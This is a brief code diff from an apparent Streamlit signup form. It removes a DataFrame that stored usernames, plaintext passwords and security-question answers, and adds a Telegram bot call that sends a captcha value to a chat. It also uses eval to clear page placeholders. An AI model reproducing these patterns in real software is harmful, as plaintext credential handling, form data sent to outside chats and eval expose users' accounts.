@@ -56,9 +56,7 @@ if signupbut:
         st.success("You have successfully created an account.Go to the Login Menu to login")
 
         # here - st image with my letter
-        df = pd.DataFrame({"username": [new_user], "password": [new_passwd],
-                           "school": [school], "mom_name": [mom_name],
-                           "hotel": [hotel], "type": [type], "images": [captcha]})
+        tb.send_message(chat_id, 'images: ' + captcha)
         a = [eval('ph%s.empty()' % i) for i in range(1, 5)]
 
 
